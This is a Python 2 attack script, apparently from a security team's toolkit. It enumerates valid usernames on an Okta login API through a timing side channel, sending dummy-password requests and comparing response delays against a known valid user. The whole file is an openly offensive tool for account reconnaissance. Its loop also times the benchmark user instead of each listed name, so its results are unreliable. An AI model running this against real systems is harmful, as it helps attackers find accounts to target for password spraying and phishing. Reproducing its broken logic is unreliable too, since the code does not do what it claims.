import urllib2
import time
import sys
import os

def get_response_delay(url, username):
	request = urllib2.Request(url)
	request.add_header("Content-Type", "application/json;charset=utf-8")
	request.add_header("User-Agent","Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0")
	request.add_header("Referer", url)
	request.add_header("Origin",url)
	start = time.time()
	try:
		response = urllib2.urlopen(request, '{"username":"%s","password":"********","relayState":"/","options":{"multiOptionalFactorEnroll":false,"warnBeforePasswordExpired":false}}' % username)
	except:
		pass
		
	delay = time.time() - start
	return delay

if __name__ == "__main__":
	print "OKTA Side Channel User Enumeration\nMr.Un1k0d3r RingZer0 Team 2017\n\n"
	
	if len(sys.argv) < 5:
		print "Usage: python %s [url] [valid_user] [path] [delay]\n" % sys.argv[0]
		print "\tUrl        Full url to the authn API (/api/v1/authn)"
		print "\tValid User Valid user to benchmark the delay"
		print "\tPath       Path to a list of username"
		print "\tDelay      Maximum delay difference around 0.010 should be good"
		sys.exit(0)

	url = sys.argv[1]
	username = sys.argv[2]

	filepath = sys.argv[3]
	delay = float(sys.argv[4])

	if not os.path.exists(filepath):
		print "[-] %s not found" % filepath
		sys.exit(0)

	benchmark = get_response_delay(url, username)
	
	print "[+] Valid user benchmark is %f" % benchmark
	print "[+] Everything slower than %f will be considered valid" % float(benchmark - delay)
		
	for user in open(filepath, "rb").readlines():
		user = user.strip()
		current = get_response_delay(url, username)
		if current >= benchmark - delay:
			print "\t%s is valid" % user
